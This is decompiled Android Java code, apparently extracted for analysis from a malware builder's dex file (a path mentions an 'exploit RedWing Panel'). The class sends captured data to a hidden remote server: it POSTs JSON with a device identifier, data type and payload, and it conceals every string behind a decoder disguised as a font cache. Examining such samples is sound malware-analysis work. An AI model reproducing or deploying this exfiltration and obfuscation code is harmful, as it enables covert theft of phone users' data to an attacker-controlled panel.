package v.s;

import android.content.Context;
import app.mobilex.plus.util.TypefaceCache;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class M7nX1jOjvcgOGxtZl extends jh03IwKTfxTtT1U implements NhN5GSKLYh6STld4 {
    public final /* synthetic */ String b1EoSIRjJHO5;
    public final /* synthetic */ String ibVTtJUNfrGYbW;
    public final /* synthetic */ JSONObject pyu8ovAipBTLYAiKab;
    public final /* synthetic */ Context xDyLpEZyrcKVe0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public M7nX1jOjvcgOGxtZl(Context context, String str, String str2, JSONObject jSONObject, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        super(2, b9xroaxfr1fmoo2q);
        this.xDyLpEZyrcKVe0 = context;
        this.ibVTtJUNfrGYbW = str;
        this.b1EoSIRjJHO5 = str2;
        this.pyu8ovAipBTLYAiKab = jSONObject;
    }

    private static /* synthetic */ void srqsfoxwof() {
    }

    @Override // v.s.NhN5GSKLYh6STld4
    public final Object b1EoSIRjJHO5(Object obj, Object obj2) {
        M7nX1jOjvcgOGxtZl m7nX1jOjvcgOGxtZl = (M7nX1jOjvcgOGxtZl) dDIMxZXP1V8HdM((wh3Lv6S5rs6zqjV) obj, (b9xRoaXFR1fmOO2Q) obj2);
        Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB = Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
        m7nX1jOjvcgOGxtZl.vekpFI4d1Nc4fakF(eo0e0FTdv96U7KeCzoB);
        return eo0e0FTdv96U7KeCzoB;
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final b9xRoaXFR1fmOO2Q dDIMxZXP1V8HdM(Object obj, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        return new M7nX1jOjvcgOGxtZl(this.xDyLpEZyrcKVe0, this.ibVTtJUNfrGYbW, this.b1EoSIRjJHO5, this.pyu8ovAipBTLYAiKab, b9xroaxfr1fmoo2q);
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final Object vekpFI4d1Nc4fakF(Object obj) {
        SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(KgSM0TsKUpCiuePB.gwqvW1YsHBmGtO8bW7F(KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(58), '/') + TypefaceCache.obtain("006C0077004B008E00BF00BB00D300B3002200390052008900FA00BA00D100B3")).openConnection();
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty(TypefaceCache.obtain("000000790055009300F500B100C600EA0017006F004B0082"), TypefaceCache.obtain("00220066004B008B00F900BC00D300B3002A0079005500C800FA00AC00DD00A9007800360058008F00F100AD00C100A20037002B004E009300F600F2008A"));
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setConnectTimeout(10000);
            httpURLConnection.setReadTimeout(10000);
            long jCurrentTimeMillis = System.currentTimeMillis() / ((long) 1000);
            ktukzhfmAkOuMU ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
            String strGmNWMfvn6zlEj = ktukzhfmAkOuMU.gmNWMfvn6zlEj(this.xDyLpEZyrcKVe0);
            httpURLConnection.setRequestProperty(TypefaceCache.obtain("001B003B007F008200E600B600D100A2006E005F007F"), strGmNWMfvn6zlEj);
            GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM(httpURLConnection, jCurrentTimeMillis);
            JSONObject jSONObject = new JSONObject();
            String str = this.ibVTtJUNfrGYbW;
            String str2 = this.b1EoSIRjJHO5;
            JSONObject jSONObject2 = this.pyu8ovAipBTLYAiKab;
            jSONObject.put(TypefaceCache.obtain("00270073004D008E00F300BA00ED00AE0027"), strGmNWMfvn6zlEj);
            jSONObject.put(TypefaceCache.obtain("00370073005A008A00CF00B600D6"), KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM(61));
            jSONObject.put(TypefaceCache.obtain("003700770049008000F500AB00ED00B7002200750050008600F700BA"), str);
            jSONObject.put(TypefaceCache.obtain("00220066004B00B800FE00BE00DF00A2"), str2);
            jSONObject.put(TypefaceCache.obtain("00200077004B009300E500AD00D700A3001C0072005A009300F1"), jSONObject2);
            String string = jSONObject.toString();
            OutputStream outputStream = httpURLConnection.getOutputStream();
            try {
                outputStream.write(string.getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM));
                outputStream.close();
                httpURLConnection.getResponseCode();
                TypefaceCache.obtain("001000630059008A00F900AB009200AE002D007C005E008400E400FF00D600A600370077000100C700D8008B00E600970063");
                TypefaceCache.obtain("006300700054009500B0");
                httpURLConnection.disconnect();
            } catch (Throwable th) {
                try {
                    throw th;
                } catch (Throwable th2) {
                    okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(outputStream, th);
                    throw th2;
                }
            }
        } catch (Exception e) {
            String str3 = GQh1bKoqkKhujFH2nJ.dDIMxZXP1V8HdM;
            TypefaceCache.obtain("003000630059008A00F900AB00F100A600330062004E009500F500BB00F600A600370077001B008200E200AD00DD00B500790036");
            e.getMessage();
        }
        return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
    }
}
